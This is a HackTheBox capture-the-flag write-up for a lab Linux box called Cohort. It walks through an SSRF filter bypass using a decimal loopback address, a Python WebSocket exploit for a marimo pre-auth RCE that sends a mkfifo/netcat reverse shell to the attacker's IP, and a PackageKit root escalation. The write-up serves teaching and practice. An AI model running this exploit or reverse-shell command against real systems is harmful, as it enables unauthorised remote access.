---
title: HackTheBox - Cohort
date: 2026-11-03
image: cover.png
tags: [HackTheBox, Easy, Linux]
platform: HackTheBox
os: Linux
difficulty: Easy
points: 45
released: 2026-08-01
ip: 10.129.94.113
boxAvatar: htb-cover.png
excerpt: An easy Linux box for a fictional analytics company. A "report source" validator on the client portal fetches any URL it's given, and a decimal-encoded loopback address slips past its block on internal hosts. That SSRF exposes an internal status page listing a hidden notebook subdomain running marimo, whose unauthenticated terminal WebSocket (CVE-2026-39987) hands over a shell. An outdated PackageKit (Pack2TheRoot, CVE-2026-41651) then gives root.
active: "Password123!"
---

# Cohort

Cohort is an easy-rated Linux machine for "Cohort Analytics," a fictional subscription-analytics company. Its only real attack surface is a client portal feature that fetches report URLs on the user's behalf - a textbook server-side request forgery (SSRF) with a weak block on internal addresses. Getting past that block exposes an internal status page that maps out the backend services, including an analyst notebook that was never meant to face the outside world. From there it's a pre-auth RCE in the notebook and a recent PackageKit privilege escalation to root. Every credential, hash, and IP below belongs to the lab and has no meaning outside of it.

### NMAP Scanning

```bash
PORT    STATE SERVICE   REASON         VERSION
22/tcp  open  ssh       syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp  open  http      syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://cohort.htb/
443/tcp open  ssl/https syn-ack ttl 63 nginx/1.24.0 (Ubuntu)
| tls-alpn:
|   http/1.1
|   http/1.0
|_  http/0.9
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=cohort.htb/organizationName=Cohort Analytics
| Subject Alternative Name: DNS:cohort.htb, DNS:*.cohort.htb
| Issuer: commonName=cohort.htb/organizationName=Cohort Analytics
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-06-01T18:47:07
| Not valid after:  2126-05-08T18:47:07
| MD5:   2e50:cc1d:45e6:73fd:12c5:9e21:82f2:c0ae
| SHA-1: 7e85:23e7:63eb:6541:a236:a388:fdc5:2514:8ca9:8e8c
| -----BEGIN CERTIFICATE-----
| [ ... certificate body trimmed for readability ... ]
|_-----END CERTIFICATE-----
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: 400 The plain HTTP request was sent to HTTPS port
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Just SSH and an nginx web server, with port 80 redirecting to HTTPS. The certificate covers `*.cohort.htb` as well, a hint that more than one virtual host exists.

### SSH - Banner Grabbing

→ Command: `nc -vn 10.129.94.113 22`

{% image %}

```bash
➜  cohort nc -vn 10.129.94.113 22
(UNKNOWN) [10.129.94.113] 22 (ssh) open
SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.18
```

### WebServer Enumeration

The site redirects to `cohort.htb`, so we add it to `/etc/hosts`:

```bash
➜  cohort cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali
::1		localhost ip6-localhost ip6-loopback
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters

10.129.94.113	cohort.htb
```

The client portal has a "Register a report source URL" form: give it a data feed URL and it fetches it once to check that it's reachable and in a recognised format, returning a short preview. Its notes say internal and loopback addresses are rejected:

{% image2 %}

Pointing it at a netcat listener on our machine confirms the server makes the request itself, identifying as `CohortInsights/1.0 (+source-validator)`:

{% image3 %}

`mitmproxy` doesn't reveal anything more about the request:

```bash
sudo mitmproxy --mode regular --listen-host 0.0.0.0 --listen-port 80
```

{% image4 %}

The interesting part is the block on internal addresses. Writing `127.0.0.1` as a single decimal number, `2130706433`, gets past the filter - the validator fetches `http://2130706433/` and returns the server's own page, so we have SSRF against localhost:

{% image5 %}

To see what else is reachable internally, we save the Burp request to a file and let `ffuf` fuzz the path through the SSRF:

```bash
ffuf -request file.req -request-proto https -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc all -fs 1077
```

{% image6 %}

The only interesting hit is a `status` endpoint:

{% image7 %}

```bash
{"service":"cohort-edge","status":"ok","generated_by":"nginx","upstreams":[{"name":"marketing","host":"cohort.htb","root":"/var/www/cohort"},{"name":"insights-api","host":"cohort.htb","path":"/api/","target":"127.0.0.1:5000"},{"name":"notebooks","host":"nb-1be3782a8afd3ad5.cohort.htb","target":"127.0.0.1:8888","note":"internal analyst workspace, not for external use"}]}
```

It's the edge proxy's map of its upstreams: the marketing site, an "insights" API on `127.0.0.1:5000`, and a notebooks service on `127.0.0.1:8888`, served on its own subdomain and labelled "internal analyst workspace, not for external use". The proxy routes that subdomain from outside anyway, so we add it to `/etc/hosts`:

```bash
➜  cohort cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali
::1		localhost ip6-localhost ip6-loopback
ff02::1		ip6-allnodes
ff02::2		ip6-allrouters

10.129.94.113	cohort.htb nb-1be3782a8afd3ad5.cohort.htb
```

### Internal Subdomain Enumeration

The subdomain asks for an access token or password, and guesses get "Invalid password":

{% image8 %}

The login page itself doesn't name the product, but a reverse image search on its `favicon.ico` identifies it as **marimo**, an open-source Python notebook.

marimo is affected by `CVE-2026-39987`, a pre-authentication RCE: its terminal WebSocket endpoint, `/terminal/ws`, doesn't check authentication, so anyone who can reach it gets a full PTY shell on the server - the password screen protects everything except the terminal. The details and a Python proof of concept are in marimo's own advisory, [GHSA-2679-6mx9-h9xc](https://github.com/marimo-team/marimo/security/advisories/GHSA-2679-6mx9-h9xc).

First we check that the WebSocket endpoint is there:

```bash
curl ws://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws
```

{% image9 %}

It responds, so we adapt the advisory's proof of concept (with Claude's help) into a small WebSocket client that connects over TLS, opens the terminal, and sends a reverse-shell command:

```python
import socket
import ssl
import os
import base64
import struct

TARGET_IP = "10.129.94.113"
HOST = "nb-1be3782afd3ad5.cohort.htb"
PATH = "/terminal/ws"
LHOST = "10.10.14.11"
LPORT = 4444

def connect():
    raw = socket.create_connection((TARGET_IP, 443), timeout=5)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    s = ctx.wrap_socket(raw, server_hostname=HOST)

    key = base64.b64encode(os.urandom(16)).decode()
    req = (
        f"GET {PATH} HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: {key}\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        f"Origin: https://{HOST}\r\n"
        "\r\n"
    )
    s.sendall(req.encode())

    s.settimeout(5)
    resp = b""
    while b"\r\n\r\n" not in resp:
        chunk = s.recv(4096)
        if not chunk:
            raise ConnectionError("Server closed the connection during the handshake")
        resp += chunk

    print(resp.decode(errors="replace"))
    if b"101 Switching Protocols" not in resp:
        raise ConnectionError("WebSocket handshake not accepted")
    return s

def recv_exact(s, size):
    data = b""
    while len(data) < size:
        chunk = s.recv(size - len(data))
        if not chunk:
            raise ConnectionError("Connection closed while reading")
        data += chunk
    return data

def recv_frame(s):
    header = s.recv(2)
    if len(header) != 2:
        raise ConnectionError("Connection closed when receiving frame")
    byte1, byte2 = header
    fin = byte1 & 0x80
    opcode = byte1 & 0x0F
    masked = byte2 & 0x80
    length = byte2 & 0x7F

    if length == 126:
        length = struct.unpack("!H", recv_exact(s, 2))[0]
    elif length == 127:
        length = struct.unpack("!Q", recv_exact(s, 8))[0]

    mask = b""
    if masked:
        mask = recv_exact(s, 4)

    payload = recv_exact(s, length)
    if masked:
        payload = bytes(payload[i] ^ mask[i % 4] for i in range(len(payload)))

    return fin, opcode, payload

def send_frame(s, payload, opcode=0x1):
    if isinstance(payload, str):
        payload = payload.encode()

    mask_key = os.urandom(4)
    first_byte = 0x80 | opcode
    length = len(payload)

    if length < 126:
        header = struct.pack("!BB", first_byte, 0x80 | length)
    elif length < 65536:
        header = struct.pack("!BBH", first_byte, 0x80 | 126, length)
    else:
        header = struct.pack("!BBQ", first_byte, 0x80 | 127, length)

    masked_payload = bytes(payload[i] ^ mask_key[i % 4] for i in range(len(payload)))
    s.sendall(header + mask_key + masked_payload)

def send_text(s, text):
    send_frame(s, text, opcode=0x1)

def recv_frames(s, count=1, timeout=2):
    output = b""
    s.settimeout(timeout)
    for _ in range(count):
        try:
            fin, opcode, payload = recv_frame(s)
        except (socket.timeout, ConnectionError):
            break
        if opcode in (0x1, 0x2):      # text or binary
            output += payload
        elif opcode == 0x8:           # close
            break
        elif opcode == 0x9:           # ping -> pong
            send_frame(s, payload, opcode=0xA)
        elif opcode == 0xA:           # pong
            continue
    return output

def main():
    s = connect()

    # Drain initial Marimo terminal output
    data = recv_frames(s, count=6, timeout=2)
    if data:
        print(data.decode(errors="replace"))

    # Reverse shell
    cmd = (
        f"id; rm -f /tmp/f; mkfifo /tmp/f; "
        f"cat /tmp/f | sh -i 2>&1 | nc {LHOST} {LPORT} > /tmp/f; hostname\n"
    )
    send_text(s, cmd)

    data = recv_frames(s, count=4, timeout=3)
    if data:
        print(data.decode(errors="replace"))

    s.close()

if __name__ == "__main__":
    main()
```

Running it gets us a reverse shell as the `marimo` user:

{% image10 %}

From there we can read the user flag:

{% image11 %}

### Privilege Escalation

Running `linpeas` on the box flags PackageKit as vulnerable to **Pack2TheRoot** (`CVE-2026-41651`), a local privilege escalation in the PackageKit daemon. The installed version, `1.2.8-2ubuntu1.2`, is below Ubuntu 24.04's fixed release, `1.2.8-2ubuntu1.5`:

```bash
╔═══════╣ Checking for PackageKit Pack2TheRoot (CVE -2026 -41651-41651) (T1068)
╚ <https: //github.security.telekom.com/2026/04/pack2theroot-linux-local-privilege-escalation.html>
PackageKit version detected: 1.2.8-2ubuntu1.2
Vulnerable to CVE-2026-41651 (Pack2TheRoot) - PackageKit 1.2.8-2ubuntu1.2 is below the Ubuntu 24.04 fixed version: 1.2.8-2ubuntu1.5
```

We transfer a public exploit for it and run it as `marimo`. It stages packages in `/tmp` and floods the daemon with transaction requests until it leaves behind a root-owned SUID shell, giving us an effective UID of 0:

{% image12 %}

With root, we read the final flag:

{% image13 %}

Cohort is a good example of how much one SSRF can reveal. The validator's blocklist checked the obvious spellings of localhost but not the others, and once inside, a helpful status page told us exactly where the "internal only" notebook lived - behind a proxy that served it to everyone anyway. A login screen in front of the notebook didn't matter because its terminal never asked for it, and an unpatched system package closed the gap to root.